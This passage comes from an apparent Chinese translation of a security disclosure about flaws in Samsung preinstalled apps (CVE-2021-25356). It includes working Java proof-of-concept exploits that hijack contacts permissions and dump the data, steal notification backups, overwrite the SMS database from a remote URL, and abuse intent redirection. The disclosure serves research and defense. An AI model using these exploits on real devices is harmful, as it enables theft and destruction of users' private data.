\"com.android.managedprovisioning.preprovisioning.PreProvisioningActivity\");\ni.putExtra(\"provisioningParams\", params);\ni.putExtra(\"com.samsung.knox.container.requestId\", 1);\ni.putExtra(\"com.samsung.knox.container.configType\", \"knox-do-basic\");\nstartActivity(i);\n</code></pre> <p>\u6253\u5f00\u5e94\u7528\u7a0b\u5e8f\u540e\uff0c\u53d1\u751f\u4e86\u4ee5\u4e0b\u60c5\u51b5\uff1a</p> <ol> <li>Managed Provisioning \u88ab\u8feb\u4ece\u653b\u51fb\u8005\u6307\u5b9a\u7684\u94fe\u63a5\u4e0b\u8f7d\u6076\u610f\u5e94\u7528\u7a0b\u5e8f</li> <li>\u6b65\u9aa4 1 \u4e2d\u5b89\u88c5\u7684\u6076\u610f\u5e94\u7528\u7a0b\u5e8f\u88ab\u8bbe\u7f6e\u4e3a\u5177\u6709\u4efb\u610f\u6743\u9650\u7684\u8bbe\u5907\u7ba1\u7406\u5458</li> <li>\u542f\u52a8\u4e86\u4e00\u4e2a\u8fc7\u7a0b\uff0c\u8be5\u8fc7\u7a0b\u5c06\u5220\u9664\u5b89\u88c5\u5728\u540c\u4e00\u8bbe\u5907\u4e0a\u7684\u6240\u6709\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u3002</li> </ol> <p>\u653b\u51fb\u770b\u8d77\u6765\u662f\u8fd9\u6837\u7684\uff1a</p>"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_8","title":"\u5b89\u5168\u6587\u4ef6\u5939\u4e2d\u7684\u6f0f\u6d1e","text":"<p>\u5b89\u5168\u6587\u4ef6\u5939\u662f\u9884\u88c5\u5728\u4e09\u661f\u8bbe\u5907\u4e0a\u7684\u5b89\u5168\u6587\u4ef6\u5b58\u50a8\u5e94\u7528\u7a0b\u5e8f\u3002\u5b83\u62e5\u6709\u5927\u91cf\u6743\u9650\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5229\u7528\u5728\u8bbf\u95ee\u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u7a0b\u5e8f\u4e2d\u53d1\u73b0\u7684\u6f0f\u6d1e\u6765\u62e6\u622a\u8fd9\u4e9b\u6743\u9650\uff1a</p> <p> \u4e00\u65e6\u653b\u51fb\u8005\u6536\u5230\u4ed6\u4eec\u53d1\u9001\u7684\u610f\u56fe\uff0c\u4ed6\u4eec\u5c31\u80fd\u591f\u62e6\u622a\u6743\u9650\u3002</p> <p>\u4f5c\u4e3a PoC\uff0c\u6211\u4eec\u62e6\u622a\u4e86\u8bfb/\u5199\u8054\u7cfb\u4eba\u7684\u6743\u9650\uff1a</p> <pre><code>protected void onCreate(Bundle savedInstanceState) {\n   super.onCreate(savedInstanceState);\n\n   Intent i = new Intent();\n   i.setClassName(\"com.samsung.knox.securefolder\", \"com.samsung.knox.securefolder.containeragent.ui.settings.KnoxSettingCheckLockTypeActivity\");\n   i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);\n   i.setData(ContactsContract.RawContacts.CONTENT_URI);\n   startActivityForResult(i, 0);\n}\n\nprotected void onActivityResult(int requestCode, int resultCode, Intent data) {\n   super.onActivityResult(requestCode, resultCode, data);\n\n   dump(data.getData());\n}\n\nprivate void dump(Uri uri) {\n   Cursor cursor = getContentResolver().query(uri, null, null, null, null);\n   if (cursor.moveToFirst()) {\n       do {\n           StringBuilder sb = new StringBuilder();\n           for (int i = 0; i &lt; cursor.getColumnCount(); i++) {\n               if (sb.length() &gt; 0) {\n                   sb.append(\", \");\n               }\n               sb.append(cursor.getColumnName(i) + \" = \" + cursor.getString(i));\n           }\n           Log.d(\"evil\", sb.toString());\n       }\n       while (cursor.moveToNext());\n   }\n}\n</code></pre>"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#secsettings","title":"SecSettings \u4e2d\u7684\u6f0f\u6d1e","text":"<p>SecSettings \u662f\u4e09\u661f\u9884\u88c5\u7684\u8bbe\u7f6e\u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>\u4ece UID 1000 (\u00a0<code>system</code>)\u8bfb\u53d6\u548c\u5199\u5165\u4efb\u610f\u6587\u4ef6\u7684\u6f0f\u6d1e\u7531\u4e24\u4e2a\u7ec4\u4ef6\u7ec4\u6210\uff1a</p> <ul> <li>\u8bbf\u95ee\u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u8005</li> <li>\u5728<code>com.sec.imsservice</code>\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5229\u7528\u4e0d\u5b89\u5168\u7684 FileProvider</li> </ul> <p> \u8fd9\u4e2a\u94fe\u662f\u552f\u4e00\u53ef\u80fd\u7684\uff0c\u56e0\u4e3a\u4e24\u4e2a\u5e94\u7528\u7a0b\u5e8f\u90fd\u4f7f\u7528\u5728\u5b83\u4eec\u7684<code>AndroidManifest.xml</code>: \u4e2d\u6307\u5b9a\u7684\u76f8\u540c\u5171\u4eab UID\u00a0<code>android:sharedUserId=\"android.uid.system\"</code>\u3002\u4e8b\u5b9e\u4e0a\uff0c\u8fd9\u4e2a\u8bbe\u7f6e\u610f\u5473\u7740\u4e24\u4e2a\u4e0d\u540c\u7684\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u5b8c\u5168\u5171\u4eab\u6240\u6709\u8d44\u6e90\uff0c\u5e76\u4e14\u53ef\u4ee5\u5b8c\u5168\u8bbf\u95ee\u5f7c\u6b64\u7684\u7ec4\u4ef6\u3002SecSettings \u4e2d\u7684\u6f0f\u6d1e\u662f Google \u7684\u3002\u5b83\u5df2\u62a5\u544a\u7ed9 Android VDP\u3002\u5956\u91d1\u4e3a2000\u7f8e\u5143\u3002\u6211\u4eec\u5c06\u5728\u7b2c 2 \u90e8\u5206\u6587\u7ae0\u4e2d\u62ab\u9732\u6b64\u95ee\u9898\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p>"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#dex-ui","title":"\u4e09\u661f DeX \u7cfb\u7edf UI \u4e2d\u7684\u6f0f\u6d1e","text":"<p>\u6b64\u6f0f\u6d1e\u5141\u8bb8\u653b\u51fb\u8005\u4ece\u7528\u6237\u901a\u77e5\u4e2d\u7a83\u53d6\u6570\u636e\uff0c\u8fd9\u4e9b\u6570\u636e\u901a\u5e38\u5305\u62ec Telegram\u3001Google Docs \u6587\u4ef6\u5939\u3001\u4e09\u661f\u7535\u5b50\u90ae\u4ef6\u548c Gmail \u6536\u4ef6\u7bb1\u7684\u804a\u5929\u63cf\u8ff0\uff0c\u4ee5\u53ca\u6765\u81ea\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u901a\u77e5\u7684\u4fe1\u606f\u3002</p> <p>\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u6fc0\u6d3b\u8be5\u529f\u80fd\u5728 SD \u5361\u4e0a\u7684\u5168\u5c40\u53ef\u8bfb\u76ee\u5f55\u4e2d\u521b\u5efa\u5907\u4efd\uff1a</p> <p> \u7531\u4e8e\u6587\u4ef6\u5728\u521b\u5efa\u5907\u4efd\u540e\u7acb\u5373\u88ab\u5220\u9664\uff0c\u56e0\u6b64\u6211\u4eec\u6dfb\u52a0\u4e86\u521b\u5efa\u5907\u4efd\u526f\u672c\u7684\u529f\u80fd\u4ee5\u9632\u6b62\u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\u3002</p> <p>\u6982\u5ff5\u8bc1\u660e\uff1a</p> <pre><code>final File root = Environment.getExternalStorageDirectory();\nfinal File policyFile = new File(root, \"notification_policy.xml\");\nfinal File backupCopy = new File(root, \"backup\");\n\nIntent i = new Intent(\"com.samsung.android.intent.action.REQUEST_BACKUP_NOTIFICATION\");\ni.setClassName(\"com.samsung.desktopsystemui\", \"com.samsung.desktopsystemui.NotificationBackupRestoreManager$NotificationBnRReceiver\");\ni.putExtra(\"SAVE_PATH\", root.getAbsolutePath());\ni.putExtra(\"SESSION_KEY\", \"not_empty\");\nsendBroadcast(i);\n\nnew Thread(() -&gt; {\n   while (true) {\n       if(policyFile.exists()) {\n           try {\n               InputStream i = new FileInputStream(policyFile);\n               OutputStream o = new FileOutputStream(backupCopy);\n               IOUtils.copy(i, o);\n               i.close();\n               o.close();\n           } catch (Throwable th) {\n               throw new RuntimeException(th);\n           }\n       }\n   }\n}).start();\n</code></pre>"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#telephonyui","title":"TelephonyUI \u4e2d\u7684\u6f0f\u6d1e","text":"<p>\u63a5\u6536\u5668<code>com.samsung.android.app.telephonyui.carrierui.photoring.model.PhotoringReceiver</code>\u88ab\u5bfc\u51fa\u3002\u5b83\u5c06\u6587\u4ef6\u4ece \u4e2d\u6307\u5b9a\u7684 URL \u4fdd\u5b58\u5230 \u4e2d\u6307\u5b9a<code>photoring_uri</code>\u7684\u8def\u5f84<code>down_file</code>\u3002\u8fd9\u662f\u7531\u8fc7\u5ea6\u5b89\u5168\u7684 Android \u626b\u63cf\u4eea\u68c0\u6d4b\u5230\u7684\uff1a</p> <p></p> <p>\u552f\u4e00\u7684\u8981\u6c42\u662f\u670d\u52a1\u5668\u54cd\u5e94\u7684\u5185\u5bb9\u7c7b\u578b\u5e94\u8be5\u662f<code>image/*</code>or\u00a0<code>video/*</code>\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u4f7f\u7528\u6587\u4ef6\u540d<code>test.mp4</code>\uff0cAmazon S3 \u81ea\u52a8\u6307\u5b9a<code>video/mp4</code>\u54cd\u5e94\u4e2d\u7684\u5185\u5bb9\u7c7b\u578b\u3002</p> <p>\u6982\u5ff5\u8bc1\u660e\uff1a</p> <pre><code>File dbPath = new File(getPackageManager().getApplicationInfo(\"com.android.providers.telephony\", 0).dataDir, \"databases/mmssms.db\");\n\nIntent i = new Intent(\"com.samsung.android.app.telephonyui.action.DOWNLOAD_PHOTORING\");\ni.setClassName(\"com.samsung.android.app.telephonyui\", \"com.samsung.android.app.telephonyui.carrierui.photoring.model.PhotoringReceiver\");\ni.putExtra(\"photoring_uri\", \"https://redacted.s3.amazonaws.com/test.mp4\");\ni.putExtra(\"down_file\", dbPath.getAbsolutePath());\nsendBroadcast(i);\n</code></pre> <p>\u7ed3\u679c\uff0c\u5e26\u6709 SMS/MMS \u6d88\u606f\u7684\u6587\u4ef6\u88ab\u653b\u51fb\u8005\u63a7\u5236\u7684\u5185\u5bb9\u8986\u76d6\u3002</p>"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#phototable","title":"PhotoTable \u4e2d\u7684\u6f0f\u6d1e","text":"<p>\u5728 PhotoTable \u4e2d\uff0c\u6211\u4eec\u53d1\u73b0\u4e86Intent redirection\uff0c\u5b83\u5141\u8bb8\u5bf9\u5185\u5bb9\u63d0\u4f9b\u8005\u7684\u8bbf\u95ee\u88ab\u62e6\u622a\uff1a</p> <p> \u6211\u4eec\u5229\u7528\u8be5\u6f0f\u6d1e\u52ab\u6301\u4e86\u8bbf\u95ee SD \u5361\u7684\u6743\u9650\u3002\u8fd9\u662f\u6982\u5ff5\u8bc1\u660e\uff1a</p> <pre><code>protected void onCreate(Bundle savedInstanceState) {\n   super.onCreate(savedInstanceState);\n   handle(getIntent());\n}\n\nprotected void onNewIntent(Intent intent) {\n   super.onNewIntent(intent);\n   handle(intent);\n}\n\nprivate void handle(Intent intent) {\n   if(\"evil\".equals(intent.getAction())) {\n       String uri = MediaStore.Images.Media.insertImage(getContentResolver(),\n               Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888),\n               \"Title_1337\",\n               \"Description_1337\");\n       Log.d(\"evil\", \"Result: \" + uri);\n   }\n   else {\n       Intent next = new Intent(\"evil\", MediaStore.Images.Media.EXTERNAL_CONTENT_URI);\n       next.setFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);\n       next.setClass(this, getClass());\n\n       Intent i = new Intent();\n       i.setClassName(\"com.android.dreams.phototable\", \"com.android.dreams.phototable.PermissionsRequestActivity\");\n       i.putExtra(\"previous_intent\", next);\n       i.putExtra(\"permission_list\", new String[0]);\n       startActivity(i);\n   }\n}\n</code></pre> <p>from</p> <p>\u539f\u6587\u94fe\u63a5\uff1a https://www.ddosi.org/cve-2021-25356/</p>"}]}